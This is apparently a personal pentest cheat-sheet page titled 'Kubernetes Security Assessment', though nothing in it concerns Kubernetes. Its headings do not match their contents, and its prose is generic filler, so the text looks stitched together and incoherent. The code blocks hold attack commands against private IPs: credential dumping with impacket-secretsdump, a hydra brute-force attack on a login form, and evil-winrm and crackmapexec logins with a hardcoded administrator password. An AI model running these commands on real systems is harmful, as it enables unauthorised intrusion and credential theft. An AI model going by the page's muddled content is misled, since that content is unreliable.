---
TitleSEO: "Kubernetes Security Assessment | ZureFX"
TitlePost: "Kubernetes Security Assessment"
Author: "ZureFX"
Description: "Personal notes on Kubernetes Security Assessment. Quick reference for pentesting and CTF challenges."
Keywords: "cheatsheet, linux, lateral movement, oscp, enumeration"
URL: "https://zurefx.github.io/notes/note-kubernetes-security-assessment-169.html"
URL_IMAGES: ""
Date: "2025-07-21"
Tags: "Cheatsheet, Linux, Lateral Movement, OSCP, Enumeration"
Section: "notes"
Lang: "en"
main_img: "note-kubernetes-security-assessment-169"
Permalink: "/notes/note-kubernetes-security-assessment-169.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Debian

### atexec

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.26.152.142
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.24.205.25/FUZZ
```

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.44.228.15 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
evil-winrm -i 10.97.130.171 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p587,8080,1433 10.84.50.18 -oN scan.txt
```

## Insecure Deserialization

### XSS

- `ACL Abuse`
- `sqlmap`
- `john`

The scheduled task ran with elevated privileges and could be abused for escalation. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.25.144.242
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.103.215.154
crackmapexec smb 10.111.9.224 -u administrator -p 'P@ssw0rd!' --shares
```

> **Note:** Unquoted Service Path was identified as the primary attack vector in this scenario.

## POP3

### nmap

Token impersonation allowed elevation to SYSTEM privileges on the target. Initial enumeration revealed several interesting open ports on the target.

Authentication bypass was achieved through careful manipulation of the login mechanism. The application stored sensitive credentials in an unencrypted configuration file. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
feroxbuster -h
nmap -sCV -p9200,8888,8443 10.99.104.233 -oN scan.txt
```

## hashcat

### IMAP

> **Note:** Resource-Based Constrained Delegation was identified as the primary attack vector in this scenario.

The kernel version was outdated and vulnerable to a publicly known exploit. Weak file permissions allowed modification of critical system files.

> **Note:** CSRF was identified as the primary attack vector in this scenario.
